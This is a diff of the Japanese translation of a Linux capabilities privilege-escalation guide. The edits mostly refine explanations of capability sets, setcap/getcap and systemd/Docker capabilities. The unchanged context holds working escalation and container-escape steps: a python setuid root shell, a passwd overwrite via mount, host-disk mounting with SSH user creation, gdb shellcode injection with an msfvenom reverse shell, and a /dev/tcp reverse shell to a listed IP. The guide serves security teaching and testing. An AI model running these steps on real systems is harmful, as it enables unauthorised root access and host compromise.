@@ -1,70 +1,59 @@
 # Linux Capabilities
 
-{{#include ../../banners/hacktricks-training.md}}
-
-
-## Linux Capabilities
-
-Linux capabilitiesは、**root権限をより小さく独立した単位に分割**し、プロセスに権限のサブセットを付与します。これにより、不要な場合に完全なroot権限を付与せず、リスクを最小限に抑えられます。<sup>[[5]](#references)</sup>
+Linux capabilities は、**root privileges をより小さく独立した単位に分割**し、process に privilege の一部だけを付与できるようにします。これにより、不要に root privileges を全面的に付与することがなくなり、risks を最小限に抑えられます。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>
 
 ### 問題:
 
-- 通常のユーザーは権限が制限されているため、rootアクセスを必要とするネットワークソケットのオープンなどのタスクに影響します。
+- 通常の users には、raw sockets のオープンや 1024 未満の Internet ports への bind などの操作に対する permissions が制限されています。capabilities を使用すると、full root privilege ではなく、必要な操作だけを付与できます。<sup>[[14]](#references)</sup>
 
 ### Capability Sets:
 
+Linux は thread ごとに以下の capability sets を公開し、process が credentials を変更したり file を実行したりする際に、kernel がそれらの制約を適用します。<sup>[[14]](#references)</sup>
+
 1. **Inherited (CapInh)**:
 
-- **目的**: 親プロセスから引き継がれるcapabilitiesを決定します。
-- **機能**: 新しいプロセスが作成されると、このsetに含まれるcapabilitiesを親から継承します。プロセスのspawn全体で特定の権限を維持する場合に役立ちます。
-- **制限**: プロセスは、親プロセスが保有していなかったcapabilitiesを取得できません。<sup>[[3]](#references)</sup>
+- **目的**: 実行された file に一致する inheritable file capabilities がある場合に、`execve()` 後の permitted set に追加される可能性のある capabilities を識別します。
+- **機能**: thread の inheritable set は `execve()` をまたいで保持されますが、それだけで capabilities が effective になることはありません。
+- **制限**: この set への capability の追加は、permitted set と bounding set によって制限されます。<sup>[[14]](#references)</sup>
 
 2. **Effective (CapEff)**:
 
-- **目的**: プロセスがその時点で実際に使用しているcapabilitiesを表します。
-- **機能**: さまざまな操作に対する権限を付与するためにkernelが確認するcapabilitiesのsetです。ファイルの場合、このsetは、ファイルのpermitted capabilitiesを有効なものとして扱うかどうかを示すflagになります。
-- **重要性**: effective setは即時の権限チェックに不可欠であり、プロセスが使用できるcapabilitiesのactive setとして機能します。
+- **目的**: process がその時点で実際に利用している capabilities を表します。
+- **機能**: さまざまな操作の permission を付与するために kernel がチェックする capabilities の set です。files の場合、この set は、その file の permitted capabilities を effective として扱うかどうかを示す flag になります。
+- **重要性**: effective set は即時の privilege checks に不可欠であり、process が使用できる capabilities の active set として機能します。
 
 3. **Permitted (CapPrm)**:
 
-- **目的**: プロセスが保有できるcapabilitiesの最大setを定義します。
-- **機能**: プロセスはpermitted setからcapabilityをeffective setへ昇格させ、そのcapabilityを使用できるようにできます。また、permitted setからcapabilitiesを削除することもできます。
-- **境界**: プロセスが保有できるcapabilitiesの上限として機能し、定義済みの権限範囲を超えないようにします。
+- **目的**: process が保持できる capabilities の最大 set を定義します。
+- **機能**: process は permitted set の capability を effective set に昇格させ、その capability を使用できるようにできます。また、permitted set から capabilities を削除することもできます。
+- **境界**: この set から capability を削除すると、それを付与する file の実行や、別の privileged transition を行わない限り、通常は復元できません。<sup>[[14]](#references)</sup>
 
 4. **Bounding (CapBnd)**:
 
-- **目的**: プロセスがライフサイクル中に取得できるcapabilitiesに上限を設定します。
-- **機能**: プロセスがinheritable setまたはpermitted setに特定のcapabilityを保有していても、それがbounding setにも含まれていない限り取得できません。
-- **用途**: このsetは、プロセスのprivilege escalationの可能性を制限する場合に特に有用であり、セキュリティにさらなる層を追加します。
+- **目的**: `execve()` 中に file から process が取得できる capabilities と、process が inheritable set に追加できる capabilities を制限します。
+- **機能**: この set は `fork()` をまたいで継承され、`execve()` をまたいで保持されます。caller が `CAP_SETPCAP` を持っている場合、この set から capabilities を削除できます。
+- **ユースケース**: この set から不要な capabilities を削除することで、後続の privilege acquisition を制限できます。<sup>[[14]](#references)</sup>
 
 5. **Ambient (CapAmb)**:
-- **目的**: 通常はプロセスのcapabilitiesが完全にresetされる`execve` system callの前後で、特定のcapabilitiesを維持できるようにします。
-- **機能**: 関連付けられたfile capabilitiesを持たないnon-SUIDプログラムが、特定の権限を保持できるようにします。
-- **制限**: このset内のcapabilitiesはinheritable setおよびpermitted setの制約を受けるため、プロセスに許可された権限を超えることはありません。<sup>[[8]](#references)[[9]](#references)</sup>
-```python
-# Code to demonstrate the interaction of different capability sets might look like this:
-# Note: This is pseudo-code for illustrative purposes only.
-def manage_capabilities(process):
-if process.has_capability('cap_setpcap'):
-process.add_capability_to_set('CapPrm', 'new_capability')
-process.limit_capabilities('CapBnd')
-process.preserve_capabilities_across_execve('CapAmb')
-```
-## Processes & Binaries Capabilities
+- **目的**: nonprivileged program の `execve()` 後も、選択した capabilities を permitted および effective として維持できるようにします。
+- **機能**: 実行された file が privileged でない場合、ambient capabilities は新しい permitted set と effective set に追加されます。
+- **制限**: capability は permitted set と inheritable set の両方に存在する間だけ ambient にできます。set-user-ID/set-group-ID file、または capabilities を持つ file を実行すると、ambient set はクリアされます。<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>
 
-### Processes Capabilities
+## Processes と Binaries の Capabilities
 
-特定の process の capabilities を確認するには、/proc directory 内の **status** file を使用します。より詳細な情報が提供されるため、Linux capabilities に関連する情報のみに限定します。\
-すべての実行中の process では、capability information は thread ごとに保持され、file system 上の binaries では extended attributes に保存されることに注意してください。<sup>[[4]](#references)</sup>
+### Processes の Capabilities
+
+特定の process の capabilities を確認するには、/proc directory 内の **status** file を使用します。より多くの details が提供されるため、ここでは Linux capabilities に関連する情報だけに限定します。\
+実行中のすべての processes では capability information が thread ごとに保持され、file capabilities は `security.capability` extended attributes に保存される点に注意してください。<sup>[[14]](#references)[[15]](#references)</sup>
 
 capabilities は /usr/include/linux/capability.h で定義されています。
 
-現在の process の capabilities は `cat /proc/self/status` または `capsh --print` で確認でき、他の users の capabilities は `/proc/<pid>/status` で確認できます。
+current process の capabilities は `cat /proc/self/status` または `capsh --print` で確認でき、他の processes の capabilities は `/proc/<pid>/status` で確認できます。<sup>[[15]](#references)[[26]](#references)</sup>
 ```bash
 cat /proc/1234/status | grep Cap
 cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
 ```
-このコマンドは、ほとんどのシステムで5行を返します。
+このコマンドは、ほとんどのシステムで5つの capability 行を返します。<sup>[[15]](#references)</sup>
 
 - CapInh = 継承された capabilities
 - CapPrm = 許可された capabilities
@@ -79,12 +68,12 @@ CapEff: 0000003fffffffff
 CapBnd: 0000003fffffffff
 CapAmb: 0000000000000000
 ```
-これらの16進数は意味をなしません。capsh utilityを使用すると、capabilitiesの名前にデコードできます。
+これらの16進数は意味が分かりません。`capsh` utilityを使用すると、capability名にデコードできます。<sup>[[26]](#references)</sup>
 ```bash
 capsh --decode=0000003fffffffff
 0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
 ```
-ここで、`ping` が使用する **capabilities** を確認してみましょう:
+それでは、`ping` が使用する **capabilities** を確認しましょう：
 ```bash
 cat /proc/9491/status | grep Cap
 CapInh:    0000000000000000
@@ -96,11 +85,11 @@ CapAmb:    0000000000000000
 capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
-それでも機能しますが、別のより簡単な方法があります。実行中の process の capabilities を確認するには、**getpcaps** tool の後にその process ID (PID) を指定します。process ID のリストを指定することもできます。
+これでも機能しますが、別のより簡単な方法があります。実行中のプロセスの capabilities を確認するには、**getpcaps** tool にプロセス ID（PID）を指定して使用します。プロセス ID のリストにも対応しています。<sup>[[22]](#references)</sup>
 ```bash
 getpcaps 1234
 ```
-ここでは、ネットワークを sniff するためにバイナリに十分な capabilities（`cap_net_admin` と `cap_net_raw`）を付与した後の `tcpdump` の capabilities を確認します（_tcpdump はプロセス 9562 で実行中です_）：
+バイナリに `cap_net_admin` と `cap_net_raw` を付与してネットワークを sniff した後の `tcpdump` の capabilities を確認します（`tcpdump` はプロセス 9562 で実行されています）。<sup>[[22]](#references)[[25]](#references)</sup>
 ```bash
 #The following command give tcpdump the needed capabilities to sniff traffic
 $ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
@@ -118,42 +107,40 @@ CapAmb:    0000000000000000
 $ capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
-ご覧のとおり、指定された capabilities は、binary の capabilities を取得する2つの方法の結果に対応しています。\
-_getpcaps_ tool は **capget()** system call を使用して、特定の thread で利用可能な capabilities を照会します。この system call では、より詳しい情報を取得するために PID を指定するだけで済みます。
+ご覧のとおり、capabilities はプロセスを調査する2つの方法の結果と一致します。`getpcaps` ツールは libcap を使用して対象プロセスの capabilities を照会し、テキスト形式で出力します。1つ以上の PID を受け取ります。<sup>[[22]](#references)</sup>
 
-### Binaries Capabilities
+### バイナリの Capabilities
 
-Binaries には、実行時に使用できる capabilities を設定できます。たとえば、`ping` binary に `cap_net_raw` capability が設定されていることは非常によくあります。
+バイナリには、実行時に適用されるファイル capabilities を設定できます。例えば、`ping` バイナリには `cap_net_raw` capability が付与されている場合があります。<sup>[[14]](#references)</sup>
 ```bash
 getcap /usr/bin/ping
 /usr/bin/ping = cap_net_raw+ep
 ```
-**capabilities が設定されたバイナリは、次の方法で検索できます：**
+`getcap -r`を使用して、**capabilitiesを持つバイナリを検索**できます。<sup>[[23]](#references)</sup>
 ```bash
 getcap -r / 2>/dev/null
 ```
-### capsh による capabilities の削除
+### capshで capabilities を削除する
 
-\_ping* から CAP*NET_RAW capabilities を削除すると、ping utility は動作しなくなるはずです。
+現在の bounding set から `CAP_NET_RAW` を削除すると、その capability を必要とするプログラムは、もはや使用できなくなるはずです。<sup>[[26]](#references)</sup>
 ```bash
 capsh --drop=cap_net_raw --print -- -c "tcpdump"
 ```
-_capsh_ 自体の出力に加えて、_tcpdump_ コマンド自体もエラーを発生させるはずです。
+_capsh_ 自体の出力に加えて、_tcpdump_ コマンド自体もエラーを出力するはずです。
 
 > /bin/bash: /usr/sbin/tcpdump: Operation not permitted
 
-このエラーから、ping コマンドが ICMP socket を開くことを許可されていないことが明確にわかります。これで、想定どおりに動作していることを確実に確認できました。
+このエラーは、`CAP_NET_RAW` が bounding set から削除された後、要求された file capability では `tcpdump` を実行できないことを示しています。
 
 ### Capabilities の削除
 
-バイナリの capabilities は、次のコマンドを使用して削除できます。
+`setcap -r` を使用すると、ファイルの capabilities を削除できます。<sup>[[25]](#references)</sup>
 ```bash
 setcap -r </path/to/binary>
 ```
-## User Capabilities
+## ユーザー Capabilities
 
-Apparently **ユーザーにもCapabilitiesを割り当てることが可能**です。これはおそらく、ユーザーが実行するすべてのプロセスで、そのユーザーのCapabilitiesを使用できることを意味します。\
-[これ](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7)、[これ ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)、および[これ ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)によると、ユーザーに特定のCapabilitiesを付与するために設定が必要なファイルがいくつかありますが、各ユーザーにCapabilitiesを割り当てるファイルは`/etc/security/capability.conf`です。\
+Linux はログインユーザーに file capabilities を直接割り当てませんが、`pam_cap` PAM module は `/etc/security/capability.conf` を使用して、認証済みセッションに inheritable capabilities を設定できます。<sup>[[16]](#references)</sup> 各エントリでは、カンマ区切りの capability 名または番号を、1 つ以上のユーザー名に割り当てます。<sup>[[17]](#references)</sup>
 ファイルの例:
 ```bash
 # Simple
@@ -170,7 +157,7 @@ cap_sys_admin,22,25          jrsysadmin
 ```
 ## Environment Capabilities
 
-以下のプログラムをコンパイルすると、**capabilitiesを提供する環境内でbash shellをspawn**できます。
+以下のプログラムをコンパイルすると、**capabilities を提供する環境内で bash shell を spawn**できるようになります。<sup>[[14]](#references)</sup>
 ```c:ambient.c
 /*
 * Test program for the ambient capabilities
@@ -266,30 +253,29 @@ gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 ./ambient /bin/bash
 ```
-**コンパイルされた ambient binary によって実行される bash の内部**では、**新しい capabilities**を確認できます（通常のユーザーは「current」セクションに capabilities を持ちません）。
+**コンパイルされた ambient binary によって実行される bash 内では、** **新しい capabilities** を確認できます（通常のユーザーは「current」セクションに capabilities を持ちません）。<sup>[[14]](#references)</sup>
 ```bash
 capsh --print
 Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
 ```
 > [!CAUTION]
-> **許可されたセットと継承可能なセットの両方に存在する capability のみ追加できます。**
+> **許可されたセットと継承可能なセットの両方に存在する capability のみ追加できます。**<sup>[[14]](#references)</sup>
 
-### capability 対応/非対応バイナリ
+### Capability-aware/Capability-dumb バイナリ
 
-**capability 対応バイナリは、環境から付与された新しい capability を使用しませんが、capability 非対応バイナリはそれらを拒否しないため使用**します。これにより、バイナリに capability を付与する特殊な環境内では、capability 非対応バイナリが脆弱になります。
+Capability-dumb バイナリとは、file capabilities を持っているものの、それらを管理するために libcap を使用しないプログラムです。file effective ビットが設定されている場合、kernel はファイルの permitted capabilities をプロセスの effective set に有効化します。プロセスがすべての permitted capabilities を取得していなければ、実行に失敗する可能性があります。<sup>[[14]](#references)</sup>
 
-## Service の capability
+## Service の capabilities
 
-デフォルトでは、**root として実行される Service にはすべての capability が割り当てられます**。場合によっては、これが危険になる可能性があります。\
-そのため、**Service configuration** ファイルでは、Service に付与する **capability** と、不要な権限で Service が実行されるのを防ぐために Service を実行すべき **user** を**指定**できます。
+root として実行される system service は、実行環境によって制限されない限り、広範な capabilities を保持する可能性があります。systemd unit では、`User=` が service user を選択し、`AmbientCapabilities=` が実行されるプロセスの ambient set に指定された capabilities を追加します。<sup>[[18]](#references)</sup>
 ```bash
 [Service]
 User=bob
 AmbientCapabilities=CAP_NET_BIND_SERVICE
 ```
-## Docker Container における Capabilities
+## DockerコンテナのCapabilities
 
-デフォルトでは、Docker は container にいくつかの capabilities を割り当てます。どの capabilities かは、次を実行するだけで簡単に確認できます:
+DockerはデフォルトのCapabilityセットでコンテナを起動します。このセットは`--cap-add`と`--cap-drop`で変更でき、コンテナの例は`amicontained`で検査できます。<sup>[[19]](#references)[[24]](#references)</sup>
 ```bash
 docker run --rm -it  r.j3ss.co/amicontained bash
 Capabilities:
@@ -306,9 +292,9 @@ docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained 
 ```
 ## Privesc/Container Escape
 
-Capabilities は、**特権操作を実行した後に自身のプロセスを制限したい場合**（例: chroot を設定してソケットに bind した後）に便利です。しかし、悪意のある commands や arguments を渡すことで exploit され、それらが root として実行される可能性があります。<sup>[[2]](#references)</sup>
+Capabilitiesは、**特権操作を実行した後に自身のプロセスを制限したい場合**（例：chrootを設定してソケットにbindした後）に便利です。しかし、rootとして実行される悪意のあるコマンドや引数を渡すことで悪用できます。<sup>[[2]](#references)</sup>
 
-`setcap` を使用してプログラムに capabilities を強制的に付与し、`getcap` を使用してこれらを確認できます。
+`setcap`を使用してプログラムにfile capabilitiesを強制的に設定し、`getcap`で確認できます。<sup>[[23]](#references)[[25]](#references)</sup>
 ```bash
 #Set Capability
 setcap cap_net_raw+ep /sbin/ping
@@ -317,15 +303,15 @@ setcap cap_net_raw+ep /sbin/ping
 getcap /sbin/ping
 /sbin/ping = cap_net_raw+ep
 ```
-`+ep` は capability を Effective および Permitted として追加することを意味します（「-」は削除を意味します）。
+ファイル capability のテキストでは、`+ep` により指定した capability が effective set と permitted set で有効になり、`-` により選択したフラグが無効になります。<sup>[[21]](#references)</sup>
 
-システムまたはフォルダ内で capabilities を持つプログラムを特定するには：
+システムまたはフォルダー内で capability を持つプログラムを特定するには、`getcap -r` を使用します。<sup>[[23]](#references)</sup>
 ```bash
 getcap -r / 2>/dev/null
 ```
 ### Exploitation example
 
-以下の例では、バイナリ `/usr/bin/python2.6` に privesc の脆弱性があることが確認されています：
+次の例では、binary `/usr/bin/python2.6` に privesc の脆弱性があることが判明しています。
 ```bash
 setcap cap_setuid+ep /usr/bin/python2.7
 /usr/bin/python2.7 = cap_setuid+ep
@@ -333,38 +319,32 @@ setcap cap_setuid+ep /usr/bin/python2.7
 #Exploit
 /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
 ```
-`tcpdump` が**すべてのユーザーによるパケットの sniff を許可するために**必要な **Capabilities**:
+`tcpdump` に必要な **Capabilities**（**任意のユーザーがパケットを sniff できるようにするため）:
 ```bash
 setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
 getcap /usr/sbin/tcpdump
 /usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
 ```
-### "empty" capabilities の特殊なケース
+### 「空の」capabilities の特殊なケース
 
-[docs](https://man7.org/linux/man-pages/man7/capabilities.7.html) より: プログラムファイルに空の capability set を割り当てることが可能である点に注意してください。したがって、プログラムを実行するプロセスの effective および saved set-user-ID を 0 に変更するものの、そのプロセスには capabilities を一切付与しない set-user-ID-root プログラムを作成できます。つまり、次の条件を満たす binary がある場合:
-
-1. root が所有者ではない
-2. `SUID`/`SGID` ビットが設定されていない
-3. capability set が空である（例: `getcap myelf` が `myelf =ep` を返す）
-
-その場合、**その binary は root として実行されます**。
+ファイルは空の capability set を持つことがあります（`getcap myelf` は `myelf =ep` を返します）。空の set は capabilities を一切付与しませんが、root 所有の set-user-ID bit と組み合わせると、ファイル capabilities を取得せずに、実行中の process の effective ID と saved ID を 0 に変更できます。所有者が存在せず、SUID/SGID でもない `=ep` ファイルは root として実行されません。<sup>[[14]](#references)</sup>
 
 ## CAP_SYS_ADMIN
 
-**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は非常に強力な Linux capability であり、device の mount や kernel 機能の操作など、広範な **administrative privileges** を持つため、ほぼ root レベルの権限とみなされることがよくあります。system 全体をシミュレートする container には不可欠ですが、**`CAP_SYS_ADMIN` には重大な security challenge があります**。特に containerized environment では、privilege escalation や system compromise につながる可能性があるためです。そのため、この capability の使用には厳格な security assessment と慎重な管理が必要です。**principle of least privilege** に従い attack surface を最小化するため、application-specific container ではこの capability を drop することが強く推奨されます。
+**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は非常に強力な Linux capability であり、device の mount や kernel features の操作など、広範な **administrative privileges** を持つため、しばしば root に近いレベルと見なされます。システム全体を再現する container には不可欠ですが、**`CAP_SYS_ADMIN` は重大な security challenges をもたらします**。特に containerized environments では、privilege escalation や system compromise につながる可能性があるためです。したがって、その使用には厳格な security assessments と慎重な管理が必要であり、**principle of least privilege** に従い attack surface を最小化するため、application-specific containers ではこの capability を drop することが強く推奨されます。<sup>[[14]](#references)</sup>
 
-**binary を使った例**
+**binary の例**
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_admin+ep
 ```
-Pythonを使用すると、変更した _passwd_ ファイルを実際の _passwd_ ファイルの上にマウントできます。
+Pythonを使用すると、変更した _passwd_ ファイルを実際の _passwd_ ファイルの上にマウントできます:
 ```bash
 cp /etc/passwd ./ #Create a copy of the passwd file
 openssl passwd -1 -salt abc password #Get hash of "password"
 vim ./passwd #Change roots passwords of the fake passwd file
 ```
-そして最後に、変更した `passwd` ファイルを `/etc/passwd` に **mount** します:
+そして最後に、変更した `passwd` ファイルを `/etc/passwd` に **mount** します：
 ```python
 from ctypes import *
 libc = CDLL("libc.so.6")
@@ -381,7 +361,7 @@ libc.mount(source, target, filesystemtype, mountflags, options)
 
 **環境を使用した例（Docker breakout）**
 
-以下を使用して、docker container 内で有効な capabilities を確認できます。
+以下を使用して、docker container 内で有効な capabilities を確認できます:
 ```
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
@@ -394,11 +374,11 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-前の出力から、SYS_ADMIN capability が有効になっていることがわかります。
+前の出力から、SYS_ADMIN capability が有効になっていることがわかります。<sup>[[14]](#references)</sup>
 
 - **Mount**
 
-これにより、docker container は **host disk を mount して自由にアクセス**できます：
+適切な device および namespace へのアクセスがあれば、Docker container から **host disk を mount して、その内容にアクセス**できるようになります。<sup>[[14]](#references)</sup>
 ```bash
 fdisk -l #Get disk name
 Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
@@ -410,10 +390,10 @@ mount /dev/sda /mnt/ #Mount it
 cd /mnt
 chroot ./ bash #You have a shell inside the docker hosts disk
 ```
-- **フルアクセス**
+- **完全なアクセス**
 
-前の方法では、docker host のディスクにアクセスすることに成功しました。\
-host が **ssh** server を実行していることがわかった場合、**docker host** のディスク内に **user** を作成し、SSH 経由でアクセスできます：
+前の method では、host の disk にアクセスできました。\
+host が **ssh** server を実行している場合、**mounted disk** 内に user を**作成**し、SSH 経由でアクセスできます。<sup>[[14]](#references)</sup>
 ```bash
 #Like in the example before, the first step is to mount the docker host disk
 fdisk -l
@@ -429,11 +409,11 @@ ssh john@172.17.0.1 -p 2222
 ```
 ## CAP_SYS_PTRACE
 
-**これは、host 内で実行されているプロセスに shellcode を inject することで、container から escape できることを意味します。host 内で実行されているプロセスにアクセスするには、container を少なくとも **`--pid=host`** 付きで実行する必要があります。**
+`CAP_SYS_PTRACE` により、プロセスは自身の PID namespace から見える他のプロセスを trace および inspect できます。Docker container から host のプロセスを対象にするには、`--pid=host` で host の PID namespace を共有するか、対象プロセスを含む namespace に join します。<sup>[[14]](#references)[[20]](#references)</sup>
 
-**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は、`ptrace(2)` によって提供される debugging および system call tracing 機能、ならびに `process_vm_readv(2)` や `process_vm_writev(2)` のような cross-memory attach call を使用する権限を付与します。diagnostic や monitoring の目的では強力ですが、`ptrace(2)` に対する seccomp filter のような制限手段なしで `CAP_SYS_PTRACE` が有効になっていると、system security が大きく損なわれる可能性があります。具体的には、[このような proof of concept (PoC)](https://gist.github.com/thejh/8346f47e359adecd1d53) で実証されているように、seccomp によって課されたものを含む他の security restrictions を bypass するために悪用できます。<sup>[[10]](#references)</sup>
+**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は、`ptrace(2)` が提供する debugging および system call tracing 機能と、`process_vm_readv(2)` や `process_vm_writev(2)` のような cross-memory attach call を使用する能力を付与します。診断や monitoring の目的では強力ですが、`ptrace(2)` に対する seccomp filter のような制限措置なしで `CAP_SYS_PTRACE` が有効になっている場合、system security を大幅に損なう可能性があります。具体的には、[このような proof of concept (PoC)](https://gist.github.com/thejh/8346f47e359adecd1d53) で示されているように、特に seccomp によって適用された制限を bypass するために悪用できます。<sup>[[10]](#references)</sup>
 
-**binary (python) を使用した Example**
+**binary を使った例 (python)**
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_ptrace+ep
@@ -525,13 +505,13 @@ print("Final Instruction Pointer: " + hex(registers.rip))
 # Detach from the process.
 libc.ptrace(PTRACE_DETACH, pid, None, None)
 ```
-**バイナリを使った例（gdb）**
+**binary を使った例（gdb）**
 
-`ptrace` capabilityを持つ`gdb`:
+`ptrace` capability を持つ `gdb`：
 ```
 /usr/bin/gdb = cap_sys_ptrace+ep
 ```
-msfvenomでshellcodeを作成して、gdb経由でメモリにinjectする
+gdbを介してメモリにinjectするshellcodeをmsfvenomで作成する
 ```python
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
 buf =  b""
@@ -555,7 +535,7 @@ chunks += f"{byte:02x}"
 
 print(f"set {{long}}($rip+{i}) = {chunks}")
 ```
-gdbでrootプロセスをデバッグし、前に生成したgdbの行をコピー＆ペーストします：
+gdbでrootプロセスをデバッグし、先ほど生成したgdbの行をコピー＆ペーストします:
 ```bash
 # Let's write the commands to a file
 echo 'set {long}($rip+0) = 0x296a909090909090
@@ -578,23 +558,23 @@ Continuing.
 process 207009 is executing new program: /usr/bin/dash
 [...]
 ```
-**環境を使用した例（Docker breakout） - Another gdb Abuse**
+**環境を使用した例（Docker breakout）- Another gdb Abuse**
 
-**GDB** がインストールされている場合（例えば `apk add gdb` または `apt install gdb` でインストールできます）、**ホストから process を debug** して `system` function を呼び出させることができます。（この technique には `SYS_ADMIN` capability も必要です）**。**
+**GDB** がインストールされている場合（例えば `apk add gdb` または `apt install gdb` でインストールできます）、**ホストからプロセスをデバッグ**して、`system` 関数を呼び出させることができます。（この technique には capability `SYS_ADMIN` も必要です）**。**
 ```bash
 gdb -p 1234
 (gdb) call (void)system("ls")
 (gdb) call (void)system("sleep 5")
 (gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
 ```
-実行されたコマンドの出力を確認することはできませんが、そのプロセスによって実行されます（そのため、rev shell を取得します）。
+実行された command の output は確認できませんが、その process によって実行されます（そのため rev shell を取得します）。
 
 > [!WARNING]
-> エラー「No symbol "system" in current context.」が表示された場合は、gdb 経由でプログラムに shellcode を読み込む前の例を確認してください。
+> エラー `"No symbol "system" in current context."` が発生した場合は、gdb 経由でプログラムに shellcode を読み込む前の例を確認してください。
 
-**environment を使用した例（Docker breakout） - Shellcode Injection**
+**環境を使用した例（Docker breakout） - Shellcode Injection**
 
-以下を使用して、docker container 内で有効な capabilities を確認できます。
+以下を使用して、Docker container 内で有効化されている capabilities を確認できます：
 ```bash
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
@@ -607,55 +587,55 @@ uid=0(root)
 gid=0(root)
 groups=0(root
 ```
-**ホスト**で実行中の**プロセス**を一覧表示します `ps -eaf`
+**ホスト**で実行中の**processes**を一覧表示 `ps -eaf`
 
-1. **アーキテクチャ**を取得します `uname -m`
-2. アーキテクチャ用の**shellcode**を探します ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
-3. **shellcode**をプロセスのメモリに**inject**するための**プログラム**を探します ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
-4. プログラム内の**shellcode**を**変更**して、**compile**します `gcc inject.c -o inject`
-5. **inject**して**shell**を取得します: `./inject 299; nc 172.17.0.1 5600`
+1. **architecture**を取得 `uname -m`
+2. architecture用の**shellcode**を探す ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
+3. **shellcode**をprocess memoryに**inject**するための**program**を探す ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
+4. program内の**shellcode**を**modify**して**compile**する `gcc inject.c -o inject`
+5. **inject**して**shell**を取得する: `./inject 299; nc 172.17.0.1 5600`
 
 ## CAP_SYS_MODULE
 
-**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は、プロセスに**kernel modules（`init_module(2)`、`finit_module(2)`、`delete_module(2)` system calls）を load および unload する権限**を与え、kernel の中核操作への直接アクセスを可能にします。この capability は、kernel の変更によって privilege escalation やシステム全体の compromise を可能にし、Linux Security Modules や container isolation を含むすべての Linux security mechanisms を bypass できるため、重大な security risks をもたらします。<sup>[[6]](#references)</sup>
-**つまり、ホストマシンの**kernel**に kernel modules を**insert/remove**できます。**
+**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**は、processに**kernel modules（`init_module(2)`、`finit_module(2)`、`delete_module(2)` system calls）をloadおよびunloadする**権限を与え、kernelのcore operationsへ直接アクセスできるようにします。この capabilityには重大なsecurity risksがあります。moduleのloadによってkernelの動作を変更でき、isolation boundariesを無効化できる可能性があるためです。<sup>[[6]](#references)[[14]](#references)</sup>
+**これにより、processから見えるkernel内のmodulesをinsertまたはremoveできます。containerでは、それがhost kernelに対して行われるかどうかはisolation configurationに依存します**。<sup>[[14]](#references)</sup>
 
-**binary を使用した例**
+**バイナリを使った例**
 
-以下の例では、**`python`** binary にこの capability が付与されています。
+次の例では、バイナリ**`python`**にこのcapabilityがあります。
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_module+ep
 ```
